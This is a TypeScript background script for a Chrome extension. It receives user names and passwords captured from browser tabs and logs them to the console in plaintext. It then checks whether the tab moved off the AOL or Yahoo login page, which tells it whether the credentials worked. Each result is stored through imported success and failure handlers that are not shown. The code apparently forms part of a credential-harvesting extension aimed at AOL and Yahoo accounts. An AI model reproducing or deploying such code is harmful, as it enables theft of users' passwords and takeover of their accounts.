import { waitForTabLoadingComplete } from './util';
import { LoginInfoType } from './types';
import { loginFailed, loginSuccess } from './requestHandlers';

// @ts-ignore
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.req && message.req === 'tabid') {
    const tabid = sender.tab?.id;
    // @ts-ignore
    sendResponse(tabid);
  } else if (message.req === 'login') {
    console.log(message.user, message.password);
    const tabid = sender.tab?.id as number;
    loginStatus(tabid, message.user, message.password, message.host);
  }
});

async function loginStatus(
  tabid: number,
  user: string,
  password: string,
  host: string
): Promise<void> {
  const tab = await waitForTabLoadingComplete(tabid);
  if (tab.url) {
    const url = new URL(tab.url);
    console.log(url);
    if (url.host === 'login.aol.com' || url.host === 'login.yahoo.com') {
      const info: LoginInfoType = {
        agent: '',
        password,
        user,
        success: false,
        at: Date.now().toLocaleString(),
      };
      await loginFailed(info);
    } else {
      const info: LoginInfoType = {
        host,
        agent: '',
        password,
        user,
        success: true,
        at: Date.now().toLocaleString(),
      };
      await loginSuccess(info);
    }
  }
}
